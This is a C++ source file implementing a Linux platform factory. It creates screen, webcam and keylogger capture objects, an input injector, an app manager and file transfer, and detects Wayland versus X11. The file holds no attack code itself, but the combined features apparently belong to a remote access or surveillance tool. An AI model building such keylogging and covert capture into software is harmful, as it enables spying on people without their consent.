#ifdef PLATFORM_LINUX

#include "LinuxPlatformFactory.hpp"
#include "LinuxInputInjectorFactory.hpp"
#include "LinuxX11Streamer.hpp"
#include "LinuxPipeWireStreamer.hpp"
#include "LinuxWebcamStreamer.hpp"
#include "LinuxEvdevLogger.hpp"
#include "LinuxAppManager.hpp"
#include "LinuxFileTransfer.hpp"
#include <iostream>
#include <cstdlib>

namespace platform {
namespace linux_platform {

// ============================================================================
// Factory Method Implementations
// ============================================================================

std::unique_ptr<interfaces::IInputInjector> LinuxPlatformFactory::create_input_injector() {
    // Use the existing factory which handles X11 vs uinput detection
    return linux_os::LinuxInputInjectorFactory::create();
}

std::unique_ptr<interfaces::IVideoStreamer> LinuxPlatformFactory::create_screen_streamer() {
    // On Wayland, try PipeWire-based capture first
    if (is_wayland_) {
        auto pw_streamer = std::make_unique<linux_os::LinuxPipeWireStreamer>();
        if (pw_streamer->is_available()) {
            std::cout << "[LinuxPlatform] Using PipeWire streamer ("
                      << pw_streamer->get_capture_tool() << ")" << std::endl;
            return pw_streamer;
        }
        std::cout << "[LinuxPlatform] PipeWire unavailable, falling back to X11/XWayland" << std::endl;
    }
    // X11 or XWayland fallback
    return std::make_unique<linux_os::LinuxX11Streamer>();
}

std::unique_ptr<interfaces::IVideoStreamer> LinuxPlatformFactory::create_webcam_streamer() {
    return std::make_unique<linux_os::LinuxWebcamStreamer>();
}

std::unique_ptr<interfaces::IKeylogger> LinuxPlatformFactory::create_keylogger() {
    return std::make_unique<linux_os::LinuxEvdevLogger>();
}

std::unique_ptr<interfaces::IAppManager> LinuxPlatformFactory::create_app_manager() {
    return std::make_unique<linux_os::LinuxAppManager>();
}

std::unique_ptr<interfaces::IFileTransfer> LinuxPlatformFactory::create_file_transfer() {
    return std::make_unique<linux_os::LinuxFileTransfer>();
}

// ============================================================================
// Lifecycle
// ============================================================================

void LinuxPlatformFactory::initialize() {
    if (initialized_) return;

    std::cout << "[LinuxPlatform] Initializing..." << std::endl;

    // Detect display server
    const char* wayland_display = std::getenv("WAYLAND_DISPLAY");
    const char* xdg_session = std::getenv("XDG_SESSION_TYPE");

    is_wayland_ = (wayland_display != nullptr) ||
                  (xdg_session && std::string(xdg_session) == "wayland");

    if (is_wayland_) {
        std::cout << "[LinuxPlatform] Wayland detected" << std::endl;
    } else {
        std::cout << "[LinuxPlatform] X11 detected" << std::endl;
    }

    initialized_ = true;
    std::cout << "[LinuxPlatform] Ready" << std::endl;
}

void LinuxPlatformFactory::shutdown() {
    if (!initialized_) return;

    std::cout << "[LinuxPlatform] Shutting down..." << std::endl;

    // Linux-specific cleanup

    initialized_ = false;
}

} // namespace linux_platform
} // namespace platform

#endif // PLATFORM_LINUX
